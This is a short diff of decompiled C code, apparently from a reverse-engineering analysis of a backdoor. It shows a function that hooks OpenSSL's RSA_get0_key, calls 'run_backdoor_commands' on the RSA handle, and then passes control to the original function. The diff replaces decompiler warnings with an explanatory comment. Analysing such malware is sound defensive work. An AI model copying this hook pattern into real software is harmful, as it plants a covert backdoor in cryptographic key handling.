@@ -24,8 +24,7 @@ void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)
     if (r != (RSA *)0x0) {
       run_backdoor_commands(r,global_ctx,&call_orig);
     }
-                    /* WARNING: Could not recover jumptable at 0x0010a394. Too many branches */
-                    /* WARNING: Treating indirect jump as call */
+                    /* Hook tail-call: after inspecting the RSA handle it calls orig_RSA_get0_key directly, so the tail jump is intentional. */
     (*orig_RSA_get0_key)(r,n,e,d);
     return;
   }
